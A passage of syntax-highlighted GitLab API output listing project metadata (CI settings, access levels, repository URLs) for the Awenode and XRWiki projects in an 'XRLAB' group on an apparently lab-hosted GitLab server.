class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_separated_caches&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_opt_in_jwt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;public_jobs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;build_timeout&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_cancel_pending_pipelines&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_config_path&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_with_groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_pipeline_succeeds&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;allow_merge_on_skipped_pipeline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;restrict_user_defined_variables&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;request_access_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_all_discussions_are_resolved&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;remove_source_branch_after_merge&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;printing_merge_request_link_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_option&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default_off&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;enforce_auth_checks_on_uploads&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;suggestion_commit_message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issue_branch_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_deploy_strategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;continuous&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoclose_referenced_issues&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;keep_latest_artifact&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;runner_token_expiration_interval&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;project_access&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;group_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Awenode&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB / Awenode&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;awenode&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab/awenode&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:46:43.635Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;default_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;master&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;tag_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;topics&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ssh_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@gitlab.xiaorang.lab:xrlab/awenode.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;http_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/awenode.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/awenode&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;readme_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/awenode/-/blob/master/README.md&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forks_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;star_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;last_activity_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:46:43.635Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;group&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;full_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;parent_id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;issues&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/issues&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;merge_requests&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/merge_requests&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;repo_branches&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/repository/branches&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/labels&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;events&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/events&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/members&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;cluster_agents&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/cluster_agents&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;packages_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;empty_repo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;visibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;resolve_outdated_diff_discussions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_expiration_policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;cadence&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;keep_n&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;older_than&quot;</span><span class="punctuation">:</span> <span class="string">&quot;90d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex_keep&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;next_run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-26T07:46:44.614Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;jobs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_address&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;can_create_merge_request_in&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;repository_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forking_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;builds_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;pages_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;operations_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;analytics_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;security_and_compliance_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;releases_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;environments_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;feature_flags_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;infrastructure_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;monitor_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;emails_disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_runners_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;lfs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;creator_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab_project&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;finished&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;open_issues_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_default_git_depth&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_forward_deployment_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_job_token_scope_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_separated_caches&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_opt_in_jwt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;public_jobs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;build_timeout&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_cancel_pending_pipelines&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_config_path&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_with_groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_pipeline_succeeds&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;allow_merge_on_skipped_pipeline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;restrict_user_defined_variables&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;request_access_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_all_discussions_are_resolved&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;remove_source_branch_after_merge&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;printing_merge_request_link_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_option&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default_off&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;enforce_auth_checks_on_uploads&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;suggestion_commit_message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issue_branch_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_deploy_strategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;continuous&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoclose_referenced_issues&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;keep_latest_artifact&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;runner_token_expiration_interval&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;project_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">40</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;group_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Example GitBook site using GitLab Pages: https://pages.gitlab.io/gitbook&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRWiki&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB / XRWiki&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrwiki&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab/xrwiki&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:44:18.589Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;default_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;master&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;tag_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;topics&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ssh_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@gitlab.xiaorang.lab:xrlab/xrwiki.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;http_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;readme_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki/-/blob/master/README.md&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/uploads/-/system/project/avatar/2/gitbook.png&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forks_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;star_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;last_activity_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:44:18.589Z&quot;</span><span class="punctuation">,</span> </span><br><span 